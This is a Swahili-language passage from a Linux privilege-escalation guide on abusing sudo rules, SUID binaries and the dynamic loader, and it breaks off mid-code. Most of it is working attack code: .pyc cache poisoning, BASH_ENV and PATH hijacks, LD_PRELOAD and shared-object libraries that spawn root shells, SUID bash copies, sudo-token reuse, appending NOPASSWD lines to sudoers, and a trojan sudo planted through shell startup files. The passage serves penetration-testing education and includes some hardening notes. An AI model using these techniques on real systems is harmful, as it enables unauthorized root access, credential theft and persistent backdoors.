Ruhusa isiyo na vizuizi ya sudo yenye uwezo wa root kwa `prusaslicer` au `prusa-slicer` inafaa kukaguliwa ikiwa mwitaji anaweza kuchagua mradi wa `.3mf` utakaokatwa. Mradi unaweza kuwa na script ya post-processing inayoendeshwa wakati G-code inapotolewa; miradi iliyotengenezwa kwa makusudi inaweza kutekeleza amri kupitia PrusaSlicer hadi toleo la 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Thibitisha kanuni halisi ya sudo, toleo la binary na viraka vya msambazaji, chanzo cha mradi, na kama njia husika ya utoaji inaendeshwa kabla ya kuhitimisha kuwa mpaka wa haki unaweza kuvukwa. Hoja ya mradi iliyowekwa isiyobadilika au sera ya `NOEXEC` inayotumika inaweza kubadilisha matokeo. Kugundua tu kuwa slicer imesakinishwa hakuthibitishi kuwepo kwa njia ya kuongeza haki.

### SETENV

Maelekezo haya humruhusu mtumiaji **kuweka kigezo cha mazingira** anapotekeleza kitu:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Mfano huu, **uliotegemea mashine ya HTB Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking**, na hivyo kuruhusu kupakia maktaba yoyote ya Python wakati skripti inaendeshwa kama root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### `__pycache__` / `.pyc` poisoning inayoweza kuandikwa katika imports za Python zinazoruhusiwa na sudo

Ikiwa **script ya Python inayoendeshwa kwa sudo** inaingiza module ambayo saraka ya package yake ina **`__pycache__` inayoweza kuandikwa**, unaweza kubadilisha `.pyc` iliyohifadhiwa kwenye cache na kutekeleza code kama mtumiaji mwenye ruhusa za juu wakati wa import inayofuata.<sup>[[30]](#references)</sup>

- Kwa nini inafanya kazi:
  - CPython huhifadhi bytecode kwenye `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter hukagua **header** (magic + metadata ya timestamp/hash inayohusishwa na source), kisha hutekeleza code object ya marshaled iliyohifadhiwa baada ya header hiyo.
  - Ukiweza **kufuta na kuunda upya** faili iliyohifadhiwa kwenye cache kwa kuwa saraka inaweza kuandikwa, bado unaweza kubadilisha `.pyc` inayomilikiwa na root na isiyoweza kuandikwa.
- Njia ya kawaida:
  - `sudo -l` inaonyesha script ya Python au wrapper unayoweza kuendesha kama root.
  - Script hiyo inaingiza module ya ndani kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
  - Saraka ya `__pycache__` ya module iliyoingizwa inaweza kuandikwa na mtumiaji wako au na kila mtu.

Ukaguzi wa haraka:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ikiwa unaweza kukagua script yenye haki za juu, tambua moduli zilizoingizwa na njia yake ya cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Mtiririko wa kutumia vibaya:

1. Endesha script inayoruhusiwa na sudo mara moja ili Python iunde faili halali ya cache ikiwa bado haipo.
2. Soma baiti 16 za kwanza kutoka kwenye `.pyc` halali na uzitumie tena kwenye faili iliyowekewa payload.
3. Compile code object ya payload, `marshal.dumps(...)` it, futa faili asili ya cache, kisha uliunde upya kwa kutumia header asili pamoja na bytecode yako hasidi.
4. Endesha tena script inayoruhusiwa na sudo ili import itekeleze payload yako kama root.

Vidokezo muhimu:

- Kutumia tena header asili ni muhimu kwa sababu Python hukagua metadata ya cache dhidi ya faili ya source, si kama mwili wa bytecode unalingana kweli na source.
- Hii ni muhimu hasa pale faili ya source inapomilikiwa na root na hairuhusiwi kuandikwa, lakini saraka ya `__pycache__` iliyomo inaweza kuandikwa.
- `PYTHONDONTWRITEBYTECODE=1` na `python -B` huzuia Python kuandika faili mpya za `.pyc`; **hazizuii** kuipakia cache iliyopo ambayo ni halali na imebadilishwa na mshambuliaji. Kizuizi muhimu ni iwapo mtumiaji mwenye ruhusa za chini anaweza kubadilisha cache ambayo import yenye ruhusa za juu itakubali. Python hukagua metadata ya timestamp/size au hash kabla ya kupakia bytecode iliyohifadhiwa kwenye cache. Tazama [marejeo ya import ya Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) na [nyaraka za mstari wa amri](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Muundo mdogo wa proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Uimarishaji:

- Hakikisha hakuna saraka katika njia ya import ya Python yenye privileged permissions inayoweza kuandikiwa na watumiaji wenye ruhusa za chini, ikijumuisha `__pycache__`.
- Kagua umiliki na ruhusa za saraka za cache, pamoja na faili zilizopo za `.pyc`. Kuzima uandishi wa bytecode kunaweza kupunguza uundaji wa cache mpya, lakini hakufanyi cache iliyopo inayoweza kubadilishwa kuwa salama.
- Chukulia moduli za Python za ndani na saraka za cache zinazoweza kuandikiwa kama vile unavyochukulia shell scripts au shared libraries zinazoweza kuandikiwa na zinazotekelezwa na root.

### BASH_ENV ikihifadhiwa kupitia sudo env_keep → shell ya root

Ikiwa sudoers itahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya Bash ya kuanzisha shell zisizo interactive ili kutekeleza code yoyote kama root unapoendesha amri iliyoruhusiwa.<sup>[[24]](#references)</sup>

- Kwa nini inafanya kazi: Kwa shell zisizo interactive, Bash hutathmini `$BASH_ENV` na ku-source faili hiyo kabla ya kuendesha script lengwa. Sheria nyingi za sudo huruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` itahifadhiwa na sudo, faili yako ita-source huku ikiwa na ruhusa za root.<sup>[[23]](#references)</sup>

- Masharti:
  - Sheria ya sudo unayoweza kutumia (lengwa lolote linaloanzisha `/bin/bash` bila interactive, au bash script yoyote).
  - `BASH_ENV` iwepo kwenye `env_keep` (kagua kwa `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Kuimarisha usalama:
  - Ondoa `BASH_ENV` (na `ENV`) kwenye `env_keep`, na upendelee `env_reset`.
  - Epuka kutumia shell wrappers kwa amri zinazoruhusiwa kupitia sudo; tumia binaries ndogo.
  - Fikiria kuweka logging ya I/O ya sudo na kutoa arifa wakati env vars zilizohifadhiwa zinapotumika.

### Terraform kupitia sudo huku `HOME` ikiwa imehifadhiwa (!env_reset)

Sudo inaporuhusu Terraform kuendeshwa kama mtumiaji mwenye ruhusa zaidi, `!env_reset` ni kidokezo cha kuchunguza ni environment variables zipi hasa zinabaki chini ya sheria hiyo mahususi. Thibitisha thamani ya `HOME` au `TF_CLI_CONFIG_FILE` inayotumika kabla ya kudhani kuwa `.terraformrc` au `terraform.rc` inayoweza kuandikwa na mtumiaji anayeita amri ndiyo usanidi amilifu wa CLI. Ingizo la `provider_installation.dev_overrides` lina umuhimu tu ikiwa amri maalum ya Terraform inapakia provider hiyo na mtumiaji anayeita amri anaweza kuweka executable yake kwenye directory iliyochaguliwa.<sup>[[25]](#references)</sup>

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa, kisha weka plugin hasidi yenye jina linalolingana na provider (kwa mfano, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform itashindwa kwenye handshaki ya Go plugin, lakini itatekeleza payload kama root kabla haijafa, na kuacha shell ya SUID.

### Ubatilishaji wa TF_VAR + kukwepa uthibitishaji wa symlink

Vigezo vya Terraform vinaweza kutolewa kupitia vigezo vya mazingira vya `TF_VAR_<name>` ikiwa sheria mahususi ya sudo inavihifadhi. Kusoma chanzo kupitia symlink pia kunahitaji provider inayofuatilia kiungo hicho na kunakili matokeo yaliyolindwa hadi kwenye eneo lengwa ambalo mpigaji anaweza kusoma. Kuandika kwenye eneo lengwa kupitia symlink kunahitaji kivyake ingizo la eneo lengwa linalodhibitiwa na mpigaji na provider yenye upendeleo inayolifuata wakati wa kuandika; kazi ya baadaye iliyoratibiwa ni matokeo moja tu yanayowezekana. Kabla ya kujaribu mojawapo ya njia hizi, kagua ruhusa halisi ya sudo, faili husika za `.tf`, usanidi wa CLI uliochaguliwa na umiliki wa njia kwa kutumia amri za kusoma tu kama `sudo -l`, `stat` na `readlink`. Uthibitishaji dhaifu wa maandishi, kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, hautatambua symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform hutatua symlink na kunakili `/root/root.txt` halisi hadi kwenye eneo lengwa linaloweza kusomwa na mshambuliaji. Mbinu hiyo hiyo inaweza kutumika **kuandika** kwenye njia zenye upendeleo wa juu kwa kuunda mapema symlink za eneo lengwa (kwa mfano, kuelekeza njia ya eneo lengwa ya provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Kwenye baadhi ya distributions za zamani, sudo inaweza kusanidiwa kwa `requiretty`, ambayo hulazimisha sudo kufanya kazi tu kutoka kwenye TTY shirikishi. Ikiwa `!requiretty` imewekwa (au chaguo hilo halipo), sudo inaweza kutekelezwa kutoka kwenye mazingira yasiyo shirikishi kama vile reverse shells, cron jobs, au scripts.

```bash
Defaults !requiretty
```

Hili si vulnerability la moja kwa moja lenyewe, lakini linaongeza hali ambazo sheria za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye vipengee vinavyoweza kuandikiwa na mshambuliaji (kwa mfano, `/home/<user>/bin`), amri ya nje isiyo na njia kamili ndani ya lengwa linaloruhusiwa na sudo inaweza kufunikwa na amri nyingine.<sup>[[3]](#references)</sup> Kukosekana kwa `secure_path` inayotumika pia kunastahili kuchunguzwa **ikiwa** mazingira ya sudo ya amri yanahifadhi `PATH` inayodhibitiwa na mtumiaji anayeita amri; kukosekana kwake pekee hakuthibitishi kuwa hivyo ndivyo ilivyo. Soma script iliyoruhusiwa bila kuiendesha, kisha thibitisha sheria halisi ya RunAs na hoja, njia bora ya kutafuta amri inayotumika, na saraka ya awali inayoweza kuandikiwa na kufikiwa, iliyo na jina la amri hiyo. Uthibitishaji, `NOEXEC`, shell builtins, na njia kamili za amri vinaweza kubadilisha matokeo.

- Mahitaji: sheria ya sudo (mara nyingi `NOPASSWD`) inayoendesha script/binary inayotumia amri bila njia kamili (`free`, `df`, `ps`, n.k.) na kipengee cha PATH kinachoweza kuandikiwa na kutafutwa kwanza.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Kupita njia wakati wa utekelezaji wa Sudo
**Ruka** ili usome faili nyingine au utumie **symlinks**. Kwa mfano, katika faili la sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya Sudo/Binary ya SUID bila njia ya amri

Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza kuitumia vibaya kwa kubadilisha kigezo cha PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza amri nyingine bila kubainisha njia yake (kagua kila mara maudhui ya binary ya SUID isiyo ya kawaida kwa kutumia** _**strings**_ **)**.

[Mifano ya payload za kutekeleza.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary ya SUID yenye njia ya amri

Ikiwa binary ya **suid** **inatekeleza amri nyingine huku ikibainisha njia yake**, basi unaweza kujaribu **ku-export function** yenye jina sawa na amri ambayo faili ya suid inaita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda na ku-export function hiyo:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Kisha, unapoiita binary ya SUID, function hii itatekelezwa.

### Wrapper maalum za copy za SUID

Utility ya SUID inayomilikiwa na root na inayokubali njia za chanzo na lengwa inaweza kuvuka mipaka miwili tofauti ya uaminifu. Ikiunda amri ya shell kutokana na mojawapo ya hoja hizo (kwa mfano, kupitisha amri ya `cp` iliyoundwa kwa `system()`), alama maalum za shell zinaweza kutekeleza amri nyingine kwa ruhusa zake za effective. Hata ikiwa inaita `cp` kwa usalama bila shell, lengwa lisilo na vizuizi linaweza kuruhusu kuandika faili yoyote kwa ruhusa za juu, kama vile `/etc/passwd`. Kagua ushughulikiaji wa hoja wa wrapper, tabia yake ya effective UID, vizuizi vya lengwa, na kama faili iliyonakiliwa huhifadhi maudhui yanayodhibitiwa na caller; kosa la jumla la `cp` au SUID bit pekee si uthibitisho wa mojawapo ya hali hizo. Orodhesha binary na ruhusa zake bila kufanya mabadiliko kabla ya majaribio yoyote ya mkono.

### Script inayoweza kuandikwa na inayoendeshwa na SUID wrapper

Usanidi mbaya wa kawaida katika programu maalum ni wrapper ya binary ya SUID inayomilikiwa na root na inayoendesha script, huku script yenyewe ikiweza kuandikwa na watumiaji wenye ruhusa za chini.

Muundo wa kawaida:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikika, unaweza kuongeza amri za payload kisha utekeleze wrapper ya SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Ukaguzi wa haraka:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Njia hii ya shambulio ni ya kawaida hasa katika wrapper za "maintenance"/"backup" zinazosambazwa kwenye `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** hutumika kubainisha maktaba moja au zaidi zilizoshirikiwa (faili za .so) zitakazopakiwa na loader kabla ya nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu hujulikana kama kupakia maktaba mapema.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia matumizi mabaya ya kipengele hiki, hasa kwa executable za **suid/sgid**, mfumo hutekeleza masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executable ambazo ID halisi ya mtumiaji (_ruid_) hailingani na ID ya mtumiaji inayotumika (_euid_).
- Kwa executable zenye suid/sgid, hupakiwa mapema maktaba zilizo kwenye njia za kawaida pekee ambazo pia zina suid/sgid.

Kuongeza upendeleo kunaweza kutokea ikiwa unaweza kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env_keep+=LD_PRELOAD**. Mipangilio hii huruhusu kigezo cha mazingira **LD_PRELOAD** kubaki na kutambuliwa hata amri zinapoendeshwa kwa kutumia `sudo`, jambo linaloweza kusababisha utekelezaji wa msimbo wowote wenye upendeleo ulioongezeka.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Hifadhi kama **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Kisha **ikusanye** kwa kutumia:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Hatimaye, **escalate privileges** kwa kuendesha

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable ya **LD_LIBRARY_PATH**, kwa sababu anadhibiti njia ambayo libraries zitatafutwa.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** inayoonekana isiyo ya kawaida, ni vyema kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Unaweza kukagua hili kwa kutekeleza amri ifuatayo:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunadokeza uwezekano wa exploitation.

Ili ku-exploit hili, mtu angeunda faili ya C, tuseme _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Mara tu code hii itakapokusanywa na kutekelezwa, inalenga kuongeza viwango vya ruhusa kwa kubadilisha ruhusa za faili na kutekeleza shell yenye ruhusa za juu.

Kusanya faili ya C iliyo hapo juu kuwa faili ya shared object (.so) kwa kutumia:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Mwishowe, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuchochea exploit, na hivyo kuruhusu uwezekano wa kuhatarisha mfumo.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folda tunayo ruhusa ya kuandikia, tuunde library kwenye folda hiyo kwa jina linalohitajika:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ukipata hitilafu kama vile

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

hiyo ina maana kwamba library uliyotengeneza inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo mshambuliaji anaweza kutumia vibaya ili kukwepa vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa, lakini kwa hali ambapo unaweza **kuingiza arguments pekee** kwenye command.

Mradi huu hukusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa kuvuka restricted shells, kuongeza au kudumisha privileges zilizoinuliwa, kuhamisha files, kufungua bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l`, unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia kama inapata njia ya kutumia vibaya sheria yoyote ya sudo.

### Kutumia Tena Sudo Tokens

Katika hali ambapo una **sudo access** lakini huna password, unaweza kuongeza privileges kwa **kusubiri command ya sudo iendeshwe kisha kuteka token ya session**.<sup>[[18]](#references)</sup>

Mahitaji ya kuongeza privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" **ametumia `sudo`** kutekeleza jambo fulani ndani ya **dakika 15 zilizopita** (kwa chaguomsingi, huo ndio muda wa token ya sudo inayotuwezesha kutumia `sudo` bila kuweka password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuwasha `ptrace_scope` kwa muda kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kuibadilisha kabisa ndani ya `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yametimizwa, **unaweza kuongeza privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` ndani ya _/tmp_. Unaweza kuitumia **kuwasha sudo token kwenye session yako** (hutapata root shell moja kwa moja; tekeleza `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inayomilikiwa na root na yenye setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Exploit ya tatu** (`exploit_v3.sh`) **itaunda faili ya sudoers** inayofanya **tokeni za sudo zidumu milele na kuruhusu watumiaji wote kutumia sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda sudo token ya mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kubatilisha faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo yenye PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nenosiri kwa kufanya hivi:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Faili ya `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi nani anayeweza kutumia `sudo` na jinsi ya kuitumia. **Kwa chaguomsingi, faili hizi zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**Ikiwa** unaweza **kusoma** faili hii, unaweza **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** kwenye faili yoyote, utaweza **kuongeza mamlaka yako**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Njia nyingine ya kutumia vibaya ruhusa hizi:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Kuna baadhi ya mbadala wa binary ya `sudo`, kama vile `doas` ya OpenBSD. Kumbuka kuangalia usanidi wake katika `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Ikiwa `doas` inaruhusu kihariri au mkalimani, chunguza mbinu za kujinasua za mtindo wa GTFOBins:

```bash
doas vim
:!/bin/sh
```

Sheria ya `doas` yenye uwezo wa kuendesha `dstat` ya awali iliyotengenezwa kwa Python kama root pia inafaa kuchunguzwa kuhusu njia za plugin. [Mwongozo wake](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) na [msimbo wa chanzo](https://github.com/dstat-real/dstat/blob/master/dstat) vinataja `/usr/share/dstat/` na `/usr/local/share/dstat/` miongoni mwa maeneo ya plugin za `dstat_*.py`. Ikiwa mtumiaji wa sasa anaweza kuandika na kutafuta katika eneo linalotumiwa na build iliyosakinishwa, plugin iliyochaguliwa inaweza kuendeshwa kwa utambulisho wa RunAs wa `doas`. Thibitisha sheria inayotumika, namna build hiyo inavyotafuta plugin, ruhusa za saraka na saraka zake mama au ACL, na ikiwa mpigaji anaweza kuchagua plugin; sheria ya `dstat` au saraka inayoweza kuandikwa pekee ni kidokezo tu. Aina nyingine za `dstat` zinaweza kutumia mifumo tofauti ya plugin. Kagua metadata kwa njia tulivu bila kupakia plugin.

### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida huunganisha kwenye mashine na kutumia `sudo`** ili kuongeza marupurupu, na umepata shell katika muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** itakayoendesha msimbo wako kama root, kisha amri ya mtumiaji. Halafu, **rekebisha $PATH** ya muktadha wa mtumiaji (kwa mfano, kwa kuongeza njia mpya kwenye .bash_profile) ili mtumiaji anapoendesha sudo, executable yako ya sudo iendeshwe.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash), utahitaji kurekebisha faili nyingine ili kuongeza njia mpya. Kwa mfano, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hurekebisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine kwenye [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Maktaba ya Pamoja

### ld.so

Faili `/etc/ld.so.conf` huonyesha **mahali faili za usanidi zilizopakiwa zinapotoka**. Kwa kawaida, faili hii huwa na njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hiyo inamaanisha kuwa faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **huelekeza kwenye folda nyingine** ambako **maktaba** zitakuwa **zikitafutwa**. Kwa mfano, yaliyomo kwenye `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana ruhusa za kuandika** kwenye njia yoyote kati ya hizi: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyo ndani ya faili ya usanidi kwenye `/etc/ld.so.conf.d/*.conf`, anaweza kuinua haki zake.\
Angalia **jinsi ya kutumia vibaya usanidi huu usio salama** kwenye ukurasa ufuatao:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Kwa kunakili lib ndani ya `/var/tmp/flag15/`, itatumika na programu iliyo katika eneo hili kama ilivyoainishwa kwenye kigezo cha `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Kisha unda maktaba hasidi katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
